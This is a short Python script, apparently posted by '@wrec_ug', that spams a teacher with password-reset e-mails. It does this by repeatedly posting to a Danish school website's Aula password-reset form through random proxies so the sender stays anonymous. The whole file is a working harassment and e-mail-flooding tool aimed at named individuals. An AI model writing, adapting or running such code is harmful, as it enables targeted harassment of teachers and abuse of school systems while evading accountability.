# Author: @wrec_ug

import requests, random
from colorama import Fore
from argparse import ArgumentParser


""" Send teachers e-mails through specified school websites using Aula, anonymously. """


# UTILITIES
user_agent = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36'}

proxy = set()

with open("proxies.txt", "r") as file:
    content = file.readlines()
    for random_line in content:
        proxy.add(random_line.strip())

proxies = {'http': 'http://'+random.choice(list(proxy))}


def Reset_Password_Spam():

    while True:

        res = requests.post(
            f'{args.school}/user/password', headers=user_agent, proxies=proxies,

            data = {
                'name'    : args.email, 
                'form_id' : 'user_pass', 
                'op'      : 'Indsend'
            }
        )

        if 'Yderligere instruktioner' in res.text:
            print(f"{args.email} {Fore.RED}::{Fore.RESET} received e-mail.")

        elif 'findes ikke som brugernavn' in res.text:
            print(f"{args.email} Is not registered in Aula.")
            return

        else:
            print("Done ...")
            return


if __name__ == '__main__':

    parser = ArgumentParser(description='Send teachers e-mails through specified school websites using Aula, anonymously. By @binary.club')
    parser.add_argument('--school', help='School Website.', required=True)
    parser.add_argument('--email', help='Teachers e-mail.', required=True)

    args = parser.parse_args()
    
    Reset_Password_Spam()
